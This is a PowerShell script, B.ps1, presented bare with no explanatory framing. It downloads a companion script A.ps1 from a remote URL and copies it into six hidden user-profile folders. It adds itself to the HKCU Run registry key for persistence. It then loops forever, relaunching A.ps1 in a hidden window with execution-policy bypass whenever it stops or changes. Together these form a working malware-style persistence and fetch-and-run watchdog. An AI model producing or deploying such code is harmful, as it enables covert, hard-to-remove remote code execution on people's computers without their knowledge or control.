# B.ps1

$SpreadDirs = @(
    "$env:APPDATA\Microsoft\Windows",
    "$env:LOCALAPPDATA\TempData",
    "$env:APPDATA\Packages",
    "$env:LOCALAPPDATA\Packages",
    "$env:APPDATA\RoamingData",
    "$env:LOCALAPPDATA\RoamingData"
)

$Urls = @{
    "A" = "https://raw.githubusercontent.com/YourRepo/OrgScripts/main/A.ps1"
}

$RegNameB = "OrgScriptB"

function SetHiddenAttribute($path) {
    if (Test-Path $path) {
        attrib +h $path
    }
}

function Get-FileSHA256($path) {
    if (Test-Path $path) {
        return (Get-FileHash -Path $path -Algorithm SHA256).Hash
    }
    return $null
}

function DownloadFileTemp($url, $tempPath) {
    try {
        Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $tempPath -ErrorAction Stop
        return $true
    } catch {
        return $false
    }
}

function StartupCheckAndRestore($fileName, $url) {
    $tempFile = Join-Path $env:TEMP "$fileName.tmp"
    $localPaths = $SpreadDirs | ForEach-Object { Join-Path $_ $fileName }

    if (-not (DownloadFileTemp $url $tempFile)) {
        return $localPaths[0]
    }

    $remoteHash = Get-FileSHA256 $tempFile

    foreach ($localFile in $localPaths) {
        if (-not (Test-Path $localFile)) {
            Copy-Item -Path $tempFile -Destination $localFile -Force
            SetHiddenAttribute $localFile
        } else {
            $localHash = Get-FileSHA256 $localFile
            if ($localHash -ne $remoteHash) {
                Copy-Item -Path $tempFile -Destination $localFile -Force
                SetHiddenAttribute $localFile
            }
        }
    }

    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue

    return $localPaths[0]
}

function IsScriptRunning($scriptName) {
    $procs = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" | Where-Object {
        $_.CommandLine -like "*$scriptName*"
    }
    return $procs
}

function StopScriptProcesses($scriptName) {
    $procs = IsScriptRunning $scriptName
    foreach ($proc in $procs) {
        Stop-Process -Id $proc.ProcessId -Force -ErrorAction SilentlyContinue
    }
}

function StartHiddenScript($scriptPath) {
    $scriptName = [System.IO.Path]::GetFileName($scriptPath)
    if ((IsScriptRunning $scriptName).Count -eq 0) {
        Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`""
    }
}

function IsStartupRegistered($name) {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $val = Get-ItemProperty -Path $regPath -Name $name -ErrorAction SilentlyContinue
    return $null -ne $val
}

function RegisterStartup($name, $scriptPath) {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $quotedPath = "`"$scriptPath`""
    try {
        Set-ItemProperty -Path $regPath -Name $name -Value $quotedPath
    } catch {}
}

function CheckAndReRegisterStartup($name, $scriptPath) {
    if (-not (IsStartupRegistered $name)) {
        RegisterStartup $name $scriptPath
    }
}

foreach ($dir in $SpreadDirs) {
    if (-not (Test-Path $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
        attrib +h $dir
    }
}

$PathA = StartupCheckAndRestore "A.ps1" $Urls["A"]

CheckAndReRegisterStartup $RegNameB $MyInvocation.MyCommand.Path

$MonitorScripts = @{
    "A.ps1" = Get-FileSHA256 $PathA
}

$MonitorPaths = @{
    "A.ps1" = $PathA
}

while ($true) {
    foreach ($script in $MonitorScripts.Keys) {
        $currentPath = $MonitorPaths[$script]
        $currentHash = Get-FileSHA256 $currentPath

        if ($currentHash -ne $MonitorScripts[$script]) {
            StopScriptProcesses $script
            StartHiddenScript $currentPath
            $MonitorScripts[$script] = $currentHash
        } else {
            if ((IsScriptRunning $script).Count -eq 0) {
                StartHiddenScript $currentPath
            }
        }
    }
    Start-Sleep -Seconds 10
}
